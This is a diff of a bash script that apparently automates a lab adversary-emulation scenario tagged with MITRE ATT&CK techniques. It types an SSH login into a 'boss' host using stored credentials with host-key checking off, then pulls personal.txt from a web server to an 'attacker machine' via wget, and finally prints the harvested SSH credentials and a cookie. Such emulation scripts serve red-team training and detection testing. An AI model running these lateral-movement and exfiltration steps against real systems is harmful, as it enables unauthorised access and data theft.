@@ -135,7 +135,7 @@ echo "============ MITRE ATT&CK technique: Remote Services (SSH) ============"
 echo "SSH into boss"
 xdotool type "ssh -o StrictHostKeyChecking=no $SSHUSER@$BOSSIP" ; xdotool key Return ; sleep 1
 xdotool type "$SSHPASS" ; xdotool key Return ; sleep 1
-xdotool type "echo \`pwd\`" ; xdotool key Return
+xdotool type "echo \`pwd\`" ; xdotool key Return 
 xdotool type "ls" ; xdotool key Return ; sleep 1
 xdotool type "exit"; xdotool key Return ; sleep 1
 echo ""
@@ -153,7 +153,7 @@ echo "############ Exfiltration ############"
 echo "============MITRE ATT&CK technique: Exfiltration Over Alternative Protocol============"
 echo "############ Transferring file to Attacker machine ############"
 xdotool windowactivate $MAIN
-xdotool type "wget http://$WEB_IP/uploads/personal.txt";xdotool key Return
+wget http://$WEB_IP/uploads/personal.txt
 echo ""
 
 echo ""
@@ -192,8 +192,10 @@ echo $COOKIE
 echo ""
 echo "**  Boss SSH Details **"
 echo "SSH Credentials"
-echo "IP\tUsername\tPassword"
-echo "$BOSSIP\t$SSHUSER\t$SSHPASS"
+echo "IP =" $BOSSIP
+echo "Username =" $SSHUSER
+echo "Password =" $SSHPASS
 echo ""
 echo "** Boss file **"
+wait
 cat personal.txt
